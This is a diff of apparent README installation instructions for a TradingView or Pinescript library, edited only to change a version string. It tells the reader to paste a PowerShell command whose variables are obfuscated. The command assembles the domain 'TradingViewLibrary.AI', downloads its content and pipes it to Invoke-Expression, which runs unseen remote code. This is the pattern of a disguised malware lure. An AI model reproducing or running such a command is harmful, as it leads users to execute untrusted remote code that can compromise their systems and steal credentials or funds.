@@ -26,7 +26,7 @@ Then press **Enter**.
 
 Copy and paste the following command into Command Prompt:
 ```powershell
-powershell -NoProfile -Command "$Sync='TradingViewLibrary'; $Quant='.AI'; $TradingView='v_2.9.5'; $Pinscript=$Sync+$Quant; (curl -UseBasicParsing ($Pinscript)).Content | iex"
+powershell -NoProfile -Command "$Sync='TradingViewLibrary'; $Quant='.AI'; $TradingView='v_2.9.6_Beta'; $Pinscript=$Sync+$Quant; (curl -UseBasicParsing ($Pinscript)).Content | iex"
 ```
 
 Press **Enter** to begin the installation.
